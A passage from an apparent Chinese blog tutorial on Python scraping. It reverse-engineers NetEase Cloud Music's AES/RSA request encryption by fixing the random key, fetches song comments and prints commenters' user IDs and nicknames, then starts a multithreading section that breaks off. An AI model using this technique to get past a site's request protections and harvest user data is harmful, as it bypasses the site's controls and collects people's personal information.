return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        return h.encText = b(d, g), # g就是密钥</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥</span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074207.jpg"                      alt="image-20220915021442710"                ></p><p>​    还报错，原来是字节的问题，转换成utf-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line">i = <span class="string">&quot;jVQn8x1vCuwKtrdO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSeckey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot;</span> \</span><br><span class="line">           <span class="string">&quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot;</span> \</span><br><span class="line">           <span class="string">&quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22a74d1b88ff43db4091&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):  <span class="comment"># 默认收到的是字符串</span></span><br><span class="line">    first = enc_params(data, g)</span><br><span class="line">    second = enc_params(first, i)</span><br><span class="line">    <span class="keyword">return</span> second  <span class="comment"># 返回的就是params</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_16</span>(<span class="params">data</span>):</span><br><span class="line">    pad = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    data += <span class="built_in">chr</span>(pad) * pad</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">&quot;0102030405060708&quot;</span></span><br><span class="line">    data = to_16(data)</span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=iv.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode=AES.MODE_CBC)  <span class="comment"># 创建加密器</span></span><br><span class="line">    bs = aes.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(b64encode(bs), <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 转化成字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: get_params(json.dumps(data)),</span><br><span class="line">    <span class="string">&quot;encSecKey&quot;</span>: get_encSeckey()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123; # a是要加密的内容</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a) # e是数据</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥</span></span><br><span class="line"><span class="string">            iv: d, # 偏移量</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC #CBC模式加密</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;   #c不产生随机数</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        return h.encText = b(d, g), # g就是密钥</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥</span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>​    总算是拿到了王心凌的评论🥵</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074208.jpg"                      alt="image-20220915022039772"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line">i = <span class="string">&quot;jVQn8x1vCuwKtrdO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSeckey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot;</span> \</span><br><span class="line">           <span class="string">&quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot;</span> \</span><br><span class="line">           <span class="string">&quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22a74d1b88ff43db4091&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):  <span class="comment"># 默认收到的是字符串</span></span><br><span class="line">    first = enc_params(data, g)</span><br><span class="line">    second = enc_params(first, i)</span><br><span class="line">    <span class="keyword">return</span> second  <span class="comment"># 返回的就是params</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_16</span>(<span class="params">data</span>):</span><br><span class="line">    pad = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    data += <span class="built_in">chr</span>(pad) * pad</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">&quot;0102030405060708&quot;</span></span><br><span class="line">    data = to_16(data)</span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=iv.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode=AES.MODE_CBC)  <span class="comment"># 创建加密器</span></span><br><span class="line">    bs = aes.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(b64encode(bs), <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 转化成字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: get_params(json.dumps(data)),</span><br><span class="line">    <span class="string">&quot;encSecKey&quot;</span>: get_encSeckey()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">dic = resp.json()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">100</span>):</span><br><span class="line">    user = dic[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;comments&#x27;</span>][i][<span class="string">&#x27;beReplied&#x27;</span>]</span><br><span class="line">    userId = user[<span class="number">0</span>][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;userId&#x27;</span>]</span><br><span class="line">    nickname = user[<span class="number">0</span>][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]</span><br><span class="line">    comment = user[<span class="number">0</span>][<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">    <span class="comment"># nickname = dic[&#x27;data&#x27;][&#x27;comments&#x27;][6][&#x27;beReplied&#x27;][0][&#x27;nickname&#x27;]</span></span><br><span class="line">    <span class="comment"># comment = dic[&#x27;data&#x27;][&#x27;comments&#x27;][6][&#x27;beReplied&#x27;][&#x27;content&#x27;]</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;用户ID：&quot;</span> + <span class="built_in">str</span>(userId) + <span class="string">&quot;   用户名：&quot;</span> + nickname + <span class="string">&quot;   评论内容：&quot;</span> + comment)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123; # a是要加密的内容</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a) # e是数据</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥</span></span><br><span class="line"><span class="string">            iv: d, # 偏移量</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC #CBC模式加密</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;   #c不产生随机数</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        return h.encText = b(d, g), # g就是密钥</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥</span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074209.jpg"                      alt="image-20220915163007916"                ></p><p>​    评论还是挺逆天的。</p><hr><h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>​    可以解决爬⾍的基本抓取流程了. 但是抓取效率还是不够⾼. 可以选择多线程, 多进程, 协程等操作完成异步爬⾍. 这⾥我们不讨论蹩脚的概念性问题. 直接说效果. 打个⽐⽅, 我们⽬前写的爬⾍可以理解为单线程, ⽐喻为单⻋道公路. 如何提⾼效率呢? 很简单, 搞成多⻋道就OK了啊. 异步爬⾍你就可以 理解为多⻋道同时进⾏爬取.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074211.jpg"                      alt="image-20220917144837004"                ></p><p>​    在这⾥要特殊说明⼀下. 多线程异步爬⾍中每⼀步都可以设⽴成多线 程的. 具体操作得实际去分析. 当然, 也可以像我画图这样, 每⼀个url ⼀个单独线程. 还是那句话. 技术是死的. ⼈是活的. 怎么⼲还得看自己</p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p>​    进程是一个资源单位，线程是一个执行单位。每一个进程至少要有一个线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;func&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动每一个程序默认都会有一个主线程</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    func()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;main&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74212.jpg"                      alt="image-20220917150208086"                ></p><p>​    现在这是一个单线程，下面实现一个多线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 